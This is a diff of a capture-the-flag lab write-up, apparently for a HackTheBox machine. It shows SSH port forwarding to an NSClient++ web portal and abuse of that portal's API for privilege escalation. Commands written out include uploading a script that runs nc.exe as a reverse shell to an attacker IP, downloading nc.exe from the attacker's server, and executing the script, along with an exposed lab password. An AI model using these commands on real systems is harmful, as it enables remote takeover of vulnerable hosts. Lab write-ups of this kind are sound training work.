@@ -573,23 +573,41 @@ Current password: ew2x6SsGTxjRwXOT
 
 Running the command in the exploit to get the NSCP web client administrator password gave me the same password that I had seen in the `nsclient.ini` file.  
 
-Looking back through my notes, I saw that there was a port I hadn't checked out yet from my early Nmap scan.  Port TCP 8443 showed a website with the information `http-title: NSClient++`.  Navigating to `http://10.10.10.184:8443` resulted in failure.  After doing a bit more looking around I found an entry in `nsclient.ini` that seemed to specify that the Web interface could only be accessed from the specified hosts, which only included 127.0.0.1 in this case.  
+Looking back through my notes, I saw that there was a port I hadn't checked out yet from my early Nmap scan.  Port TCP 8443 showed a website with the information `http-title: NSClient++`.  Navigating to `http://10.10.10.184:8443` resulted in failure.  After doing a bit more looking around I found an entry in `nsclient.ini` that seemed to specify that the Web interface could only be accessed from the specified hosts, which only included 127.0.0.1 in this case.  _Later I noticed the port was also listed in nsclient.ini, oops._ 
 
 #### Using SSH to create a redirect tunnel \(Local Port Forwarding\)
+
+In order to access this page through the web browser without some sort of remote desktop capability I had to set up port forwarding from my local machine to the remote host.  Since the web portal would only accept traffic from it's own localhost on port 8443, we needed to set up some way to redirect traffic to and from my browser to appear to come from the remote machine.  Luckily this is pretty easy to do with SSH.
 
 {% embed url="https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/" %}
 
 `ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184`
 
-[https://127.0.0.1:8443/index.html\#/](https://127.0.0.1:8443/index.html#/)
+### The web portal on port 8443
+
+https://127.0.0.1:8443/index.html\#/
 
 ![](../.gitbook/assets/screenshot_2020-06-20_22-54-12.png)
 
+The web portal seemed somewhat complicated to interact with, and the instructions given in the exploit weren't completely clear how to link to the `evil.bat` script and it's scheduler through the web portal.  After doing lots of reading through the documentation on `nsclient`, I discovered an easier sounding method of interacting with the service.
+
 ### Taking the API route
 
-[https://docs.nsclient.org/api/](https://docs.nsclient.org/api/)
+[https://docs.nsclient.org/api/scripts/](https://docs.nsclient.org/api/scripts/)
+
+```text
+Example¶
+Given a file called check_new.bat which contains the following:
 
 
+@echo OK: %1
+@exit 0
+We can use the following curl call to upload that as check_new.
+
+
+curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/check_new.bat --data-binary @check_new.bat
+Added check_new as scripts\check_new.bat
+```
 
 ```text
 #@echo off
@@ -600,7 +618,7 @@ nadine@SERVMON C:\Users\Nadine&gt;curl -k -u admin [https://localhost:8443/api/v
 
 nadine@SERVMON C:\Temp&gt;curl -s -k -u admin -X PUT [https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat](https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat) --data-binary "C:\Temp\nc.exe 10.10.15.20 12345 -e cmd.exe" Enter host password for user 'admin': Added evil as scripts\evil.bat
 
-nadine@SERVMON C:\Users\Nadine&gt;curl -s -k -u admin [https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=5m](https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=5m)
+nadine@SERVMON C:\Users\Nadine&gt;curl -s -k -u admin [https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m](https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=5m)
 
 ```text
 nadine@SERVMON C:\Temp>curl http://10.10.15.20:8090/nc.exe
